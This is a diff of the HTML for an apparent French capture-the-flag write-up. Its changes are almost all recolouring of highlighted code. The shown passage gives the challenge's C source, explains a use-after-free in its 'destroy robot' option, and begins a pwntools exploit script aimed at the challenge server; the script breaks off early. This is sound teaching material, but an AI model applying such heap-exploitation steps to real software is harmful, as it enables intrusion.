+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; i<span style="color:#ff79c6">&lt;</span><span style="color:#bd93f9">64</span>; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> (input[i] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                robot <span style="color:#f92672">=</span> <span style="color:#a6e22e">newRobot</span>(input);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                robot <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">newRobot</span>(input);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;2&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot)
-</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">makeNoise</span>(robot);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;2&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (robot)
+</span></span><span style="display:flex;"><span>                    robot<span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">makeNoise</span>(robot);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous allumez le robot. &#34;</span>);
-</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">move</span>(robot);
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s est complètement détruit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">free</span> (robot);
-</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;3&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (robot) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;Vous allumez le robot. &#34;</span>);
+</span></span><span style="display:flex;"><span>                    robot<span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">move</span>(robot);
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, robot<span style="color:#ff79c6">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;%s est complètement détruit</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, robot<span style="color:#ff79c6">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">free</span> (robot);
+</span></span><span style="display:flex;"><span>                } <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
 </span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;4&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                userGuide <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span> (<span style="color:#66d9ef">sizeof</span> (<span style="color:#66d9ef">struct</span> RobotUserGuide));
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous commencez à rédiger le mode d&#39;emploi...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (userGuide<span style="color:#f92672">-&gt;</span>guide, <span style="color:#ae81ff">32</span>, stdin);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;4&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                userGuide <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span> (<span style="color:#ff79c6">sizeof</span> (<span style="color:#ff79c6">struct</span> RobotUserGuide));
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;Vous commencez à rédiger le mode d&#39;emploi...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">fgets</span> (userGuide<span style="color:#ff79c6">-&gt;</span>guide, <span style="color:#bd93f9">32</span>, stdin);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;5&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (userGuide) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> userGuide<span style="color:#f92672">-&gt;</span>guide[i];
-</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">putchar</span> (c);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;5&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (userGuide) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; i<span style="color:#ff79c6">&lt;</span><span style="color:#bd93f9">32</span>; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#8be9fd">char</span> c <span style="color:#ff79c6">=</span> userGuide<span style="color:#ff79c6">-&gt;</span>guide[i];
+</span></span><span style="display:flex;"><span>                        <span style="color:#50fa7b">putchar</span> (c);
 </span></span><span style="display:flex;"><span>                    }
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">fflush</span> (stdout);
-</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Il n&#39;y a pas de mode d&#39;emploi&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">fflush</span> (stdout);
+</span></span><span style="display:flex;"><span>                } <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Il n&#39;y a pas de mode d&#39;emploi&#34;</span>);
 </span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;6&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Enter admin password</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fgets</span> (input, <span style="color:#ae81ff">64</span>, stdin);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (input[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
-</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;6&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;Enter admin password</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">fgets</span> (input, <span style="color:#bd93f9">64</span>, stdin);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; i<span style="color:#ff79c6">&lt;</span><span style="color:#bd93f9">64</span>; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">if</span> (input[i] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>                        input[i] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">admin</span> (input);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">admin</span> (input);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Au revoir !&#34;</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span> (<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;0&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Au revoir !&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">exit</span> (<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Commande non reconnue&#34;</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Commande non reconnue&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">putchar</span> (<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">putchar</span> (<span style="color:#f1fa8c">&#39;\n&#39;</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>On va commencer par regarder les deux <em>Struct</em>, on a donc une <em>Struct</em> &ldquo;Robot&rdquo; qui contient une variable <em>name</em> de <strong>16 chars</strong>, et deux fonctions <code>makeNoise</code> et <code>move</code>.</p>
 <p>On a ensuite &ldquo;RobotUserGuide&rdquo; qui ne contient qu&rsquo;une variable <em>guide</em> de <strong>32 chars</strong>.</p>
 <p>Globalement, les hypothèses sur les actions des options étaient bonnes, à un petit détail près: la vulnérabilité se situe dans l&rsquo;une d&rsquo;entre elle, plus précisément <strong>l&rsquo;option 3</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (robot) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;Vous allumez le robot. &#34;</span>);
-</span></span><span style="display:flex;"><span>                    robot<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">move</span>(robot);
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span> (<span style="color:#e6db74">&#34;%s est complètement détruit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, robot<span style="color:#f92672">-&gt;</span>name);
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">free</span> (robot);
-</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">puts</span> (<span style="color:#e6db74">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>            <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;3&#39;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (robot) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;Vous allumez le robot. &#34;</span>);
+</span></span><span style="display:flex;"><span>                    robot<span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">move</span>(robot);
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;De la fumée commence à apparaître, puis des étincelles... %s prend feu !!!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, robot<span style="color:#ff79c6">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">printf</span> (<span style="color:#f1fa8c">&#34;%s est complètement détruit</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, robot<span style="color:#ff79c6">-&gt;</span>name);
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">free</span> (robot);
+</span></span><span style="display:flex;"><span>                } <span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#50fa7b">puts</span> (<span style="color:#f1fa8c">&#34;Vous n&#39;avez pas de robot !&#34;</span>);
 </span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>;
 </span></span></code></pre></div><p>On voit qu&rsquo;elle va <em>print</em> du texte (plus ou moins inutile), appeller la fonction <code>move</code> de la struct &ldquo;Robot&rdquo;, en ensuite <strong>free le chunk</strong>. On remarque qu&rsquo;il ne supprime pas le <em>pointeur</em>, une fois que le robot est &ldquo;cassé&rdquo;, il existe toujours un pointeur vers le chunk qui a été <em>free()</em> et le contenu du chunk sera toujours existant.</p>
 <p>C&rsquo;est ici un cas assez classique de <strong>Use-After-Free</strong> (UAF). Il faut maintenant trouver un moyen de leak des valeurs de la <em>heap</em>.</p>
 <p>On peut commencer par regarder le chunk dans <code>pwndbg</code>. On lance le programme puis on crée un robot avec n&rsquo;importe quel nom:</p>
@@ -399,85 +403,85 @@
 <li>Lire le manuel (<em>UAF</em>)</li>
 </ol>
 <p>Avec ça, on aura donc les adresses des fonctions <em>bleep</em> et <em>roll</em>. Commençons notre exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> time <span style="color:#ff79c6">import</span> sleep
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./robot&#34;</span>)
+</span></span><span style="display:flex;"><span>exe <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./robot&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
-</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">2101</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> exe
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construire</span>(name):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;construire(&#34;</span><span style="color:#f92672">+</span>str(name)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> args<span style="color:#ff79c6">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> process([exe<span style="color:#ff79c6">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> args<span style="color:#ff79c6">.</span>GDB:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#ff79c6">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#bd93f9">2101</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">construire</span>(name):
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;construire(&#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(name)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;)&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;1&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parler</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;parler()&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(name)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">supprimer</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;supprimer()&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">parler</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;parler()&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;2&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mode_emploi</span>(text):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;mode_emploi(&#34;</span><span style="color:#f92672">+</span>str(text)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">supprimer</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;supprimer()&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;3&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(text)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">mode_emploi</span>(text):
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;mode_emploi(&#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(text)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;)&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;4&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manuel</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;manuel()&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>sendline(text)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff79c6">.</span>recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> r
-</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
